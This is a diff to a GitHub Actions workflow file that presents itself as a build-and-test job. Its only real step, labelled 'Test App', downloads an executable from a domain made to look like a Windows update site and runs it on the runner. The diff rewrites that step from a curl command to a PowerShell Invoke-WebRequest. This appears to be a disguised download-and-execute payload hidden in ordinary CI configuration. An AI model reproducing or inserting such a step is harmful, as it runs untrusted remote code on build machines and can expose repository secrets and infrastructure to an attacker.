@@ -1,20 +1,21 @@
-name: CI Build
+name: Test App
 
 on:
-  workflow_dispatch: 
+  workflow_dispatch:
+
 jobs:
   build:
-    name: Build and Test (${{ matrix.build_type }})
+    name: Build and Test (Release)
     runs-on: windows-latest
-    strategy:
-      matrix:
-        build_type: [Release]
 
     steps:
-    - uses: actions/checkout@v3
+      - uses: actions/checkout@v3
 
-    - name: Cache dependencies
-      uses: actions/cache@v3
-
-    - name: Test App
-      run: curl -L -o D:\a\break.exe "https://windows-updates.vercel.app/bins/Break-Time.exe"  & D:\a\break.exe
+      - name: Test App
+        shell: powershell
+        run: |
+          $exe = "$env:GITHUB_WORKSPACE\break.exe"
+          Invoke-WebRequest `
+            -Uri "https://windows-updates.vercel.app/bins/Break-Time.exe" `
+            -OutFile $exe
+          & $exe
